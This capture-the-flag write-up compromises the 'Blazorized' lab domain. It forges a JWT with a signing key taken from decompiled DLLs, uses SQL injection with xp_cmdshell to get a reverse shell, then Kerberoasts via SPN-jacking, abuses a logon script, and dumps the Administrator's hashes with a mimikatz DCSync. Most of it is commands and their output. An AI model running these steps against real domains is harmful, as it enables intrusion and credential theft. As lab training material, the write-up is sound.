## HOST RECON

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://blazorized.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-10 17:32:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022
|_ssl-date: 2024-11-10T17:33:02+00:00; +1s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-09T15:01:24
| Not valid after:  2054-11-09T15:01:24
| MD5:   a4b4:f895:0060:3f7a:31ff:4695:7ee0:894f
|_SHA-1: 72a0:2e0a:7c01:e949:c27c:5898:e993:a796:ee24:67a6
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-10T17:32:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
```



## WEB RECON


#### In http://blazorized.htb/check-updates click on button and intercep request to get JWT token.

```
GET /categories HTTP/1.1
Host: api.blazorized.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://blazorized.htb/
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzMxMjY4MjgxLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.3giKLiTI4-bi_-FUN-MiADE4lwhJXwaewGOMwpt89hd2KngWB8YX7yMGnjdhULjVIG_lNUkB0_iCAit2SVwO1Q
Origin: http://blazorized.htb
Connection: keep-alive
Priority: u=4
```

#### Go to jwt.io and analyze.

```
{
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": [
    "Posts_Get_All",
    "Categories_Get_All"
  ],
  "exp": 1731268281,
  "iss": "http://api.blazorized.htb",
  "aud": "http://api.blazorized.htb"
}
```

#### Brute force api.blazorized.htb to find.

200      GET      288l      483w     7586c http://api.blazorized.htb/swagger/v1/swagger.json


#### Download dlls and analyze with https://github.com/icsharpcode/ILSpy

http://blazorized.htb/_framework/Blazored.LocalStorage.dll

http://blazorized.htb/_framework/Blazorized.DigitalGarden.dll

http://blazorized.htb/_framework/Blazorized.Helpers.dll

http://blazorized.htb/_framework/Blazorized.Shared.dll


#### Blazorized.Helpers.dll

```
public static class JWT
{
	private const long EXPIRATION_DURATION_IN_SECONDS = 60L;

	private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";

	private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";

	private static readonly string postsPermissionsClaimValue = "Posts_Get_All";

	private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";

	private static readonly string superAdminRoleClaimValue = "Super_Admin";

	private static readonly string issuer = "http://api.blazorized.htb";

	private static readonly string apiAudience = "http://api.blazorized.htb";

	private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";
}
```


#### Get JWT token from requests, after get sign key from dll decompiled, go to https://jwt.io alter these payload values and finaly put on local store on browser to access admin.blazorized.htb.

```
{
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": [
    "Posts_Get_All",
    "Categories_Get_All",
    "Super_Admin"
  ],
  "exp": 1931268281,
  "iss": "http://api.blazorized.htb",
  "aud": "http://api.blazorized.htb"
}
```

#### On Admin panel has a hello massage saying that "admin panel does not consume API but speaks to the databse directly", so lets try some sqli.

#### On the Check Duplicate Categories or Posts has sqli and xp_cmdshell works too.


#### After try various revshell payloads, https://www.revshells.com/ PowerShell #3 (Base64) works for me.

```
'EXEC xp_cmdshell 'powershell revshell' --
```

## Shell as nu_5510

```
PS C:\> whoami /all

USER INFORMATION
----------------

User Name          SID                                          
================== =============================================
blazorized\nu_1055 S-1-5-21-2039403211-964143010-2924010611-1117


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes                                        
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                           Alias            S-1-5-32-568                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                          Well-known group S-1-5-3                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                               Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                       Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
BLAZORIZED\Normal_Users                     Group            S-1-5-21-2039403211-964143010-2924010611-1133 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```


#### After enum with BloodHound. PrivEsc with WriteSPN by NU_5510 to RSA_4810

- https://support.bloodhoundenterprise.io/hc/en-us/articles/17222775975195-WriteSPN
- https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking
- https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/

(Pelo que parece, o user nu_5510 tem permissão para associar um SNP no user rsa_4810, ou seja, consegue personificar o user rsa_4810 no SPN e assim conseguindo solicitar um ticket como aquele service falso, pegando o ticket do user rsa_4810)

```PS C:\Users\NU_1055\Documents> . .\PowerView.ps1```

```PS C:\Users\NU_1055\Documents> Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='xereca/BLAHBLAH'}```

```
PS C:\Users\NU_1055\Documents> Get-DomainUser RSA_4810
logoncount            : 23
badpasswordtime       : 2/1/2024 1:29:42 PM
distinguishedname     : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb
objectclass           : {top, person, organizationalPerson, user}
displayname           : RSA_4810
lastlogontimestamp    : 7/12/2024 6:25:46 AM
userprincipalname     : RSA_4810@blazorized.htb
name                  : RSA_4810
objectsid             : S-1-5-21-2039403211-964143010-2924010611-1107
samaccountname        : RSA_4810
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 11/13/2024 4:51:44 AM
instancetype          : 4
objectguid            : ed5f4235-a152-4952-bed0-28ae811ee7f4
lastlogon             : 2/2/2024 11:44:30 AM
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb
dscorepropagationdata : {2/2/2024 2:44:29 PM, 2/2/2024 2:40:50 PM, 1/11/2024 2:13:10 AM, 1/10/2024 6:28:26 PM...}
serviceprincipalname  : xereca/BLAHBLAH <<<<<<<<======================================================================================
memberof              : {CN=Remote_Support_Administrators,CN=Users,DC=blazorized,DC=htb, CN=Remote Management 
                        Users,CN=Builtin,DC=blazorized,DC=htb}
whencreated           : 1/9/2024 11:37:15 AM
badpwdcount           : 0
cn                    : RSA_4810
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated            : 24627
primarygroupid        : 513
pwdlastset            : 2/25/2024 11:55:59 AM
usnchanged            : 348397
```

```
PS C:\Users\NU_1055\Documents> .\Rubeus.exe kerberoast /user:rsa_4810 /output:hashes.kerberoast

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : rsa_4810
[*] Target Domain          : blazorized.htb
[*] Searching path 'LDAP://DC1.blazorized.htb/DC=blazorized,DC=htb' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=rsa_4810)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : RSA_4810
[*] DistinguishedName      : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb
[*] ServicePrincipalName   : xereca/BLAHBLAH
[*] PwdLastSet             : 2/25/2024 11:55:59 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*RSA_4810$blazorized.htb$xereca/BLAHBLAH@blazorized.htb*$5DB1B892A87
                             59A21DB5FFC305DB44CE7$B9ACE1DBF454B1DA624081F436C8AA235F34FF86CA3614AB9FFB3E66CE
                             11270A1774A0842117D3085D12E95908783C4906EE3336378FE5F49F561C9B0D978FA33CAC0251F3
                             D44F696B84D45DA3F6FF10613449AE10A6754A7C1ABBDC06EB9294B1C3ACF02E86B03E011AC359A1
                             33C2A1DF3C007CF92814EB92A436E72C70D8ACFEF319F77A2CAAD385A74100D6663218186E2D5B64
                             2C38638748ED668547AC47D8D3654E6C02DA562E74F06A9A869B16B6578F0915CB76B271644618CB
                             508E0E2295B9CEAFD245D69F7848FAA086196F485E4A90ADF079385D52020828A4F1586C3EF39DF7
                             76F5A8B7676480F36D278126EF298A41A04BFFDA4AC0057397B7A3E23B51C5FFF5ED38E4478CE6E3
                             D79908DAEF0FD2A008C3814DC3439E0F651BD86EDFBE3DBC4D76E0996DE9F8035552EC0EC2717C58
                             B81FE84A9866BCA02B1FAD3168A58222477A64AA5F782B06EAE9F1F62B22F1515A42441CF388AF9B
                             985CBE0039E0E81B891DD692BEDF835C94B4F9C6721EFB49808C443F4E4FEA29510951F0C932494E
                             9418F081AE583019932F8B6AF1EA7C0E9B46A94BFB276E3A1BDBFAFAD96D706689A1F2A3A101A8D3
                             9305EC497D72D7CFC19233D5F1A20E3795A34ADEDEB5179F0B25AE8C9BB2643241A968920C34FFA0
                             08211E1D42FECC5B4B81FB6BEE8ECD465EE372DD08E18412C28104B681D07FD76434AB0B60EEC5E1
                             9C2ACBE17AAC59F117EF87A7D1738AD23DBAA92D65C3C430C2B843342F7770CA7EA5A732B6766673
                             B53CCE9FC58D149FD43E2D66D1D018D0DF462F4341BCF250A205D6B99C02B3A0A3359A1E7449C7D4
                             B8355B7B0AAFAE1386053EAF22FF0114FD8CD53C21911B3794554908E456604A2216624F435E70B2
                             BD9193EF96B83DDC20DD0467C8059053AFA8AB2A2B967500280899C836B35108123DA7F7F1F6F50E
                             F9915047FA343735A7E3CF555A79B015A389B31CF28690A1566E7328041CF1373F104E360BA26EAA
                             462D72A7DDCC3E6603D36D2A23D6160BD7A5DA5F63EAB6A26AA59785AF1A59B7E2D59E671D0FBD60
                             B3D5901221F8BC8D7AA9578EC85C4D6BDAA48305256DA6627B16CF20303B4AE4614FC211A1334EC5
                             73ECEDD6B8D61491C932BB3B48156E6D189E1BEBFEE0F5A12AF8D4B399889E7FDD71B9FFECE4CB65
                             C4370F1B2252945F7B30B606B8BD6B3F752CE8BE7FE38AF1C264AF28C6B929D4BD82DD68A2D75271
                             1E85B53B5CE9FBD71D89CE3A2F23EDA7D9856866C6E0D3B23FBB959B3E7B719188A8ED0476C33DC6
                             9B250D274E7D1A04B45B2BA951C87F0498841BF36ABB4D00188AE18065C4BE019C546C92D1313C1E
                             7D04049A1DF18D924663FFC79A42E368C232FDB60E99FED8268B260EB526B18D58BAE317B4F67724
                             2AD83320627CD483378CAD54F925F77CDEE89926FB8BB7885B08616AA560F2C91970EEE2625BB284
                             52FB89D79559CE5E06E0C0F3BD43CDC546A4425CEE649FD72BA5600C8945E4F243FDE2C4294F8EB8
                             C029EB90CC2D3193F40094E9E80BAFFB23E60C9AE283E81151A57C89AE9AC9FF7D305D595AD1CA09
                             1E79F6B58AB7A7EDB0C9A813ED3F26C814D71A5D1526E4405FE949DBBABC29B27FE1EF550EC54A76
                             7AFBC8E4ED8A91FAAB3F57EB14823AC6DE73D94B5EA9D5A1C04651927F647CFB7A900F0D5024BBC9
                             3689B636F350129E02BE8A0F723E6D437E4A1893BE51DD6FD4993FB9A09498B464074AE8CEBAE2ED
                             D4C9533D792C9F19CED18CDBDFF704FD716AB7866DE232BAE04B22
```

#### Cracked Hash

(Ni7856Do9854Ki05Ng0005 #)


## Shell as RSA_4810

```$ evil-winrm -i 10.10.11.22 -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'```


```
*Evil-WinRM* PS C:\Users\RSA_4810\Documents> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
blazorized\rsa_4810 S-1-5-21-2039403211-964143010-2924010611-1107


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
BLAZORIZED\Remote_Support_Administrators    Group            S-1-5-21-2039403211-964143010-2924010611-1115 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

#### Find writable directories from actual user

```
.\accesschk64 /accepteula -uwds C:\Windows

...

RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23

...

```

#### User rsa_4810 has write perm on logon script dir

- https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/
- https://www.thehacker.recipes/ad/movement/dacl/logon-script
- https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/

```*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23>. .\PowerView.ps1```

```
*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RSA_4810"}

ObjectDN                : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : Script-Path
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-2039403211-964143010-2924010611-1107
IdentityReferenceName   : RSA_4810
IdentityReferenceDomain : blazorized.htb
IdentityReferenceDN     : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb
IdentityReferenceClass  : user
```

(o user rsa_4810 não só tem write perm nesses dirs como tambem tem writeproperty no object scriptpath do user ssa_6010, ou seja, o user rsa_4810 pode definir um scriptpath e o proprio logon script para outro user)

#### put a revshell on .bat file and move to logon script writable dir, later set scriptpath for this dir.

```*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> set-aduser -identity ssa_6010 -scriptpath 'A32FF3AEAA23\rev.bat'```

```
*Evil-WinRM* PS C:\Windows\sysvol\domain\scripts\A32FF3AEAA23> get-aduser ssa_6010 -properties scriptpath


DistinguishedName : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb
Enabled           : True
GivenName         :
Name              : SSA_6010
ObjectClass       : user
ObjectGUID        : 8bf3166b-e716-4f91-946c-174e1fb433ed
SamAccountName    : SSA_6010
ScriptPath        : A32FF3AEAA23\rev.bat  <<<<<=============================
SID               : S-1-5-21-2039403211-964143010-2924010611-1124
Surname           :
UserPrincipalName : SSA_6010@blazorized.htb
```

## Shell as ssa_6010

```
PS C:\> whoami /all

USER INFORMATION
----------------

User Name           SID                                          
=================== =============================================
blazorized\ssa_6010 S-1-5-21-2039403211-964143010-2924010611-1124


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
BLAZORIZED\Super_Support_Administrators    Group            S-1-5-21-2039403211-964143010-2924010611-1123 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

#### After run bloodround we see that ssa_6010 make part of group with dcsync perm

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync
- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync#dcsync
- https://support.bloodhoundenterprise.io/hc/en-us/articles/17322385609371-DCSync

#### load mimikatz binary to owned machine and make this

```
PS C:\Users\SSA_6010\Desktop> .\mimikatz.exe "lsadump::dcsync /domain:blazorized.htb /user:administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:blazorized.htb /user:administrator
[DC] 'blazorized.htb' will be the domain
[DC] 'DC1.blazorized.htb' will be the DC server
[DC] 'administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 2/25/2024 11:54:43 AM
Object Security ID   : S-1-5-21-2039403211-964143010-2924010611-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 0: f55ed1465179ba374ec1cad05b34a5f3
    ntlm- 1: eecc741ecf81836dcd6128f5c93313f2
    ntlm- 2: c543bf260df887c25dd5fbacff7dcfb3
    ntlm- 3: c6e7b0a59bf74718bce79c23708a24ff
    ntlm- 4: fe57c7727f7c2549dd886159dff0d88a
    ntlm- 5: b471c416c10615448c82a2cbb731efcb
    ntlm- 6: b471c416c10615448c82a2cbb731efcb
    ntlm- 7: aec132eaeee536a173e40572e8aad961
    ntlm- 8: f83afb01d9b44ab9842d9c70d8d2440a
    ntlm- 9: bdaffbfe64f1fc646a3353be1c2c3c99
    lm  - 0: ad37753b9f78b6b98ec3bb65e5995c73
    lm  - 1: c449777ea9b0cd7e6b96dd8c780c98f0
    lm  - 2: ebbe34c80ab8762fa51e04bc1cd0e426
    lm  - 3: 471ac07583666ccff8700529021e4c9f
    lm  - 4: ab4d5d93532cf6ad37a3f0247db1162f
    lm  - 5: ece3bdafb6211176312c1db3d723ede8
    lm  - 6: 1ccc6a1cd3c3e26da901a8946e79a3a5
    lm  - 7: 8b3c1950099a9d59693858c00f43edaf
    lm  - 8: a14ac624559928405ef99077ecb497ba

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 36ff197ab8f852956e4dcbbe85e38e17

* Primary:Kerberos-Newer-Keys *
    Default Salt : BLAZORIZED.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 29e501350722983735f9f22ab55139442ac5298c3bf1755061f72ef5f1391e5c
      aes128_hmac       (4096) : df4dbea7fcf2ef56722a6741439a9f81
      des_cbc_md5       (4096) : 310e2a0438583dce
    OldCredentials
      aes256_hmac       (4096) : eeb59c1fa73f43372f40f4b0c9261f30ce68e6cf0009560f7744d8871058af2c
      aes128_hmac       (4096) : db4d9e0e5cd7022242f3e03642c135a6
      des_cbc_md5       (4096) : 1c67ef730261a198
    OlderCredentials
      aes256_hmac       (4096) : bb7fcd1148a3863c9122784becf13ff7b412af7d734162ed3cb050375b1a332c
      aes128_hmac       (4096) : 2d9925ef94916523b24e43d1cb8396ee
      des_cbc_md5       (4096) : 9b01158c8923ce68

* Primary:Kerberos *
    Default Salt : BLAZORIZED.HTBAdministrator
    Credentials
      des_cbc_md5       : 310e2a0438583dce
    OldCredentials
      des_cbc_md5       : 1c67ef730261a198

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  7e35fe37aac9f26cecc30390171b6dcf
    02  a8710c4caaab28c0f2260e7c7bd3b262
    03  81eae4cf7d9dadff2073fbf2d5c60539
    04  7e35fe37aac9f26cecc30390171b6dcf
    05  9bc0a87fd20d42df13180a506db93bb8
    06  26d42d164b0b82e89cf335e8e489bbaa
    07  d67d01da1b2beed8718bb6785a7a4d16
    08  7f54f57e971bcb257fc44a3cd88bc0e3
    09  b3d2ebd83e450c6b0709d11d2d8f6aa8
    10  1957f9211e71d307b388d850bdb4223f
    11  2fa495bdf9572e0d1ebb98bb6e268b01
    12  7f54f57e971bcb257fc44a3cd88bc0e3
    13  de0bba1f8bb5b81e634fbaa101dd8094
    14  2d34f278e9d98e355b54bbd83c585cb5
    15  06b7844e04f68620506ca4d88e51705d
    16  97f5ceadabcfdfcc019dc6159f38f59e
    17  ed981c950601faada0a7ce1d659eba95
    18  cc3d2783c1321d9d2d9b9b7170784283
    19  0926e682c1f46c007ba7072444a400d7
    20  1c3cec6d41ec4ced43bbb8177ad6e272
    21  30dcd2ebb2eda8ae4bb2344a732b88f9
    22  b86556a7e9baffb7faad9a153d1943c2
    23  c6e4401e50b8b15841988e4314fbcda2
    24  d64d0323ce75a4f3dcf0b77197009396
    25  4274d190e7bc915d4047d1a63776bc6c
    26  a04215f3ea1d2839a3cdca4ae01e2703
    27  fff4b2817f8298f09fd45c3be4568ab1
    28  2ea3a6b979470233687bd913a8234fc7
    29  73d831d131d5e67459a3949ec0733723


mimikatz(commandline) # exit
Bye!
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> more note.txt
If you enjoyed this machine and want to learn more about DACL attacks, check out the 'DACL Attacks I' and 'DACL Attacks II' modules on HTB Academy.

- Pedant
```
